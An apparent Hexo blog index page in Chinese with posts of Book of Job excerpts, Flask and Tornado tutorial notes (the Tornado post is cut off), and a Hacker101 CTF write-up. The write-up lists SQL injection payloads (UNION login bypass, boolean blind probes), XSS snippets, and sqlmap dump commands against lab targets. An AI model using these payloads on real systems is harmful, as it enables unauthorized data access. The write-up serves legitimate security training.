<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-摘抄-约伯记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/03/05/%E6%91%98%E6%8A%84-%E7%BA%A6%E4%BC%AF%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2021-03-05T00:11:39.000Z" itemprop="datePublished">2021-03-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/03/05/%E6%91%98%E6%8A%84-%E7%BA%A6%E4%BC%AF%E8%AE%B0/">摘抄-约伯记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>1.</p>
<p>我赤身出于母胎，也必赤身归回。赏赐的是耶和华，收取的也是耶和华。耶和华的名是应当称颂的</p>
<p>2.</p>
<p>受患难的人，为何有光赐给他呢？心中愁苦的人，为何有生命赐给他呢？<br>他们切望死，却不得死。求死，胜于求隐藏的珍宝。<br>他们寻见坟墓就快乐，极其欢喜。<br>人的道路既然遮隐，神又把他四面围困，为何有光赐给他呢？</p>
<p>3.</p>
<p>神所惩治的人是有福的。所以你不可轻看全能者的管教。</p>
<p>4.</p>
<p>云彩消散而过。照样，人下阴间也不再上来。<br>他不再回自己的家，故土也不再认识他。</p>
<p>5.</p>
<p>我厌弃性命，不愿永活。</p>
<p>6.</p>
<p>你们说，神为恶人的儿女积蓄罪孽。我说，不如本人受报，好使他亲自知道。<br>愿他亲眼看见自己败亡，亲自饮全能者的忿怒。</p>
<p>7.</p>
<p>我仰望得好处，灾祸就到了。我等待光明，黑暗便来了。</p>
<p>8.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/03/05/%E6%91%98%E6%8A%84-%E7%BA%A6%E4%BC%AF%E8%AE%B0/" data-id="ckmadesnu0009y0us2fi3h9w4" data-title="摘抄-约伯记" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-Hack101" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/03/04/CTF-wp-Hack101/" class="article-date">
  <time class="dt-published" datetime="2021-03-04T07:39:53.000Z" itemprop="datePublished">2021-03-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/03/04/CTF-wp-Hack101/">CTF-wp-Hack101</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>找到flag，到主页面的submit Flag处提交</p>
<h1 id="Micro-CMS-v1"><a href="#Micro-CMS-v1" class="headerlink" title="Micro-CMS v1"></a>Micro-CMS v1</h1><p>flag0：</p>
<p>提示page后的标识，并发现创建新页面后，下标从6开始</p>
<p>尝试直接访问3、4、5，未得到结果</p>
<p>访问4时，为forbidden，访问4的修改页面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;35.190.155.168&#x2F;039f7f7659&#x2F;page&#x2F;edit&#x2F;4</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>flag1：</p>
<p>创建新页面，再编辑新页面</p>
<p>猜测编辑新页面时，使用的update * from xxx where id=$id，尝试注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;35.190.155.168&#x2F;039f7f7659&#x2F;page&#x2F;edit&#x2F;6&#39;</span><br></pre></td></tr></table></figure>


<p>flag2：</p>
<p>创建页面，题目和内容处都使用语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php alert(&#39;xss&#39;);?&gt;</span><br></pre></td></tr></table></figure>
<p>返回主页面时，得到flag</p>
<p>flag3：</p>
<p>进入markdown test页面，修改图片为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;123&quot; onclick&#x3D;&#39;alert(xss)&#39;&gt;</span><br></pre></td></tr></table></figure>


<p>点击后查看源码，得到flag</p>
<h1 id="Micro-CMS-v2"><a href="#Micro-CMS-v2" class="headerlink" title="Micro-CMS v2"></a>Micro-CMS v2</h1><p>不知道提交了什么，显示下面的错误信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if cur.execute(&#39;SELECT password FROM admins WHERE username&#x3D;\&#39;%s\&#39;&#39; % request.form[&#39;username&#39;].replace(&#39;%&#39;, &#39;%%&#39;)) &#x3D;&#x3D; 0:</span><br></pre></td></tr></table></figure>
<p>flag0：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39; union select &#39;123&#39; as password#&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
<p>提交后，在private page底下得到flag</p>
<p>flag1：</p>
<p>以post方式提交URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a1f2c0a33a&#x2F;page&#x2F;edit&#x2F;4</span><br></pre></td></tr></table></figure>
<p>得到flag（莫名其妙）</p>
<p>flag2：</p>
<p>回到登录界面，抓取登录的post包</p>
<p>使用sqlmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r 1.txt --batch --dump</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>也可以用布尔盲注的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39; or length(password)&#x3D;1 -- </span><br><span class="line"># 获取长度</span><br><span class="line">&#39; or password like &#39;a%&#39;</span><br><span class="line"># 获取密码，同理获取用户名</span><br></pre></td></tr></table></figure>
<h1 id="Encrypted-Pastebin（未做）"><a href="#Encrypted-Pastebin（未做）" class="headerlink" title="Encrypted Pastebin（未做）"></a>Encrypted Pastebin（未做）</h1><h1 id="Photo-Gallery（差一个flag）"><a href="#Photo-Gallery（差一个flag）" class="headerlink" title="Photo Gallery（差一个flag）"></a>Photo Gallery（差一个flag）</h1><p>flag1：</p>
<p>进入页面，查看源码，图片表示fetch?id=1</p>
<p>访问该页面，得到一些乱码（图片源码）</p>
<p>使用sqlmap进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Tools\注入工具\sqlmap\sqlmap.py -r C:\Users\CISP-PTE\Desktop\2.txt --batch --dump --threads 5</span><br></pre></td></tr></table></figure>
<p>在sqlmap输出的文件夹下的photos.csv文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id,title,parent,filename</span><br><span class="line">1,Utterly adorable,1,files&#x2F;adorable.jpg</span><br><span class="line">2,Purrfect,1,files&#x2F;purrfect.jpg</span><br><span class="line">3,Invisible,1,xxx</span><br></pre></td></tr></table></figure>
<p>将xxx（此处把答案删掉了）加号flag格式的前后缀，提交，得到flag1</p>
<p>flag0：</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/03/04/CTF-wp-Hack101/" data-id="ckluk74e4000cmkus220g93r7" data-title="CTF-wp-Hack101" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-DEV-python-flask" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/03/04/DEV-python-flask/" class="article-date">
  <time class="dt-published" datetime="2021-03-04T00:48:58.000Z" itemprop="datePublished">2021-03-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/03/04/DEV-python-flask/">DEV-python-flask</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h1><p>web为框架，实现一个网站或web服务</p>
<h1 id="入门程序"><a href="#入门程序" class="headerlink" title="入门程序"></a>入门程序</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask  <span class="comment"># 引入Flask类</span></span><br><span class="line">app = Flask(__name__) <span class="comment"># 创建一个单实例对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span><span class="comment"># 路径修饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask  <span class="comment"># 引入Flask类</span></span><br><span class="line">app = Flask(__name__) <span class="comment"># 创建一个单实例对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span><span class="comment"># 路径修饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Index Page&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> markupsafe <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;username&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_user_profile</span>(<span class="params">username</span>):</span></span><br><span class="line">    <span class="comment"># show the user profile for that user</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;User %s&#x27;</span> % escape(username)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/post/&lt;int:post_id&gt;&#x27;</span></span>) </span><span class="comment"># 使用converter指明参数类型</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_post</span>(<span class="params">post_id</span>):</span></span><br><span class="line">    <span class="comment"># show the post with the given id, the id is an integer</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Post %d&#x27;</span> % post_id</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/path/&lt;path:subpath&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_subpath</span>(<span class="params">subpath</span>):</span></span><br><span class="line">    <span class="comment"># show the subpath after /path/</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Subpath %s&#x27;</span> % escape(subpath)</span><br></pre></td></tr></table></figure>
<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;./hello.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<p>注意hello.html要放在当前目录的templates目录下</p>
<p>hello.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello from Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% if name %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<h1 id="获取变量"><a href="#获取变量" class="headerlink" title="获取变量"></a>获取变量</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;login&#39;, methods&#x3D;[&#39;POST&#39;, &#39;GET&#39;])</span><br><span class="line">def login():</span><br><span class="line">    error &#x3D; None</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        if valid_login(request.form[&#39;username&#39;],</span><br><span class="line">                       request.form[&#39;password&#39;]):</span><br><span class="line">            return log_the_user_in(request.form[&#39;username&#39;])</span><br><span class="line">        else:</span><br><span class="line">            error &#x3D; &#39;Invalid username&#x2F;password&#39;</span><br><span class="line">    return render_template(&#39;login.html&#39;, error&#x3D;error)</span><br></pre></td></tr></table></figure>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rom flask import request</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;upload&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        f &#x3D; request.files[&#39;the_file&#39;]</span><br><span class="line">        f.save(&#39;&#x2F;var&#x2F;www&#x2F;uploads&#x2F;uploaded_file.txt&#39;)</span><br></pre></td></tr></table></figure>
<h1 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    username &#x3D; request.cookies.get(&#39;username&#39;)</span><br><span class="line">    </span><br><span class="line">    resp &#x3D; make_response(render_template(...))</span><br><span class="line">    resp.set_cookie(&#39;username&#39;, &#39;the username&#39;)</span><br></pre></td></tr></table></figure>
<h1 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a>sessions</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, session, redirect, url_for, request</span><br><span class="line">from markupsafe import escape</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line"># Set the secret key to some random bytes. Keep this really secret!</span><br><span class="line">app.secret_key &#x3D; b&#39;_5#y2L&quot;F4Q8z\n\xec]&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    if &#39;username&#39; in session:</span><br><span class="line">        return &#39;Logged in as %s&#39; % escape(session[&#39;username&#39;])</span><br><span class="line">    return &#39;You are not logged in&#39;</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;login&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def login():</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        session[&#39;username&#39;] &#x3D; request.form[&#39;username&#39;]</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line">    return &#39;&#39;&#39;</span><br><span class="line">        &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type&#x3D;text name&#x3D;username&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type&#x3D;submit value&#x3D;Login&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;logout&#39;)</span><br><span class="line">def logout():</span><br><span class="line">    # remove the username from the session if it&#39;s there</span><br><span class="line">    session.pop(&#39;username&#39;, None)</span><br><span class="line">    return redirect(url_for(&#39;index&#39;))</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/03/04/DEV-python-flask/" data-id="ckluk74e8000hmkus5fes692x" data-title="DEV-python-flask" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dev/" rel="tag">dev</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-DEV-python-tornado" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/03/02/DEV-python-tornado/" class="article-date">
  <time class="dt-published" datetime="2021-03-02T00:52:19.000Z" itemprop="datePublished">2021-03-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/03/02/DEV-python-tornado/">DEV-python-tornado</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>转载：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/af6654deac4e">https://www.jianshu.com/p/af6654deac4e</a></p>
<h1 id="入门程序"><a href="#入门程序" class="headerlink" title="入门程序"></a>入门程序</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tornado.web <span class="comment"># tornado的基础web框架</span></span><br><span class="line"><span class="keyword">import</span> tornado.ioloop <span class="comment"># 核心io循环模块，tornado高性能处理的核心</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定义处理类型</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span> <span class="comment"># RequestHandler封装对请求处理的所有信息和处理方法</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span> <span class="comment"># 封装对应的请求方式</span></span><br><span class="line">		self.write(<span class="string">&#x27;好看的皮囊万里挑一，有趣的灵魂千篇一律。&#x27;</span>) <span class="comment"># 封装响应信息，写响应信息的一个方法</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	app = tornado.web.Application([(<span class="string">r&#x27;/&#x27;</span>, IndexHandler)])</span><br><span class="line">	app.listen(<span class="number">8889</span>) <span class="comment"># 设置监听端口</span></span><br><span class="line">	tornado.ioloop.IOLoop.current().start() <span class="comment"># current()返回当前线程的IOLoop实例对象；start()启动IOLoop实例对象</span></span><br></pre></td></tr></table></figure>
<h1 id="httpserver底层处理"><a href="#httpserver底层处理" class="headerlink" title="httpserver底层处理"></a>httpserver底层处理</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> tornado.web <span class="keyword">import</span> Application,RequestHandler</span><br><span class="line"><span class="keyword">from</span> tornado.ioloop <span class="keyword">import</span> IOLoop</span><br><span class="line"><span class="keyword">from</span> tornado.httpserver <span class="keyword">import</span> HTTPServer</span><br><span class="line"><span class="keyword">import</span> tornado.options</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span>(<span class="params">RequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.write(<span class="string">&#x27;给自己一点时间，理清所有的荒唐与期望。&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = Application([(<span class="string">r&#x27;/&#x27;</span>,IndexHandler)])</span><br><span class="line">    http_server = HTTPServer(app)</span><br><span class="line">    <span class="comment">#最原始的方式</span></span><br><span class="line">    http_server.bind(<span class="number">8888</span>)</span><br><span class="line">    http_server.start(<span class="number">0</span>)</span><br><span class="line">	<span class="comment">#使用options配置</span></span><br><span class="line">    http_server = HTTPServer(app)</span><br><span class="line">    http_server.bind(tornado.options.options.port)</span><br><span class="line">    http_server.start(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#启动Ioloop轮循监听</span></span><br><span class="line">    IOLoop.current().start()</span><br></pre></td></tr></table></figure>
<h1 id="application设置"><a href="#application设置" class="headerlink" title="application设置"></a>application设置</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tornado.web <span class="keyword">import</span> Application, RequestHandler, url</span><br><span class="line"><span class="keyword">from</span> 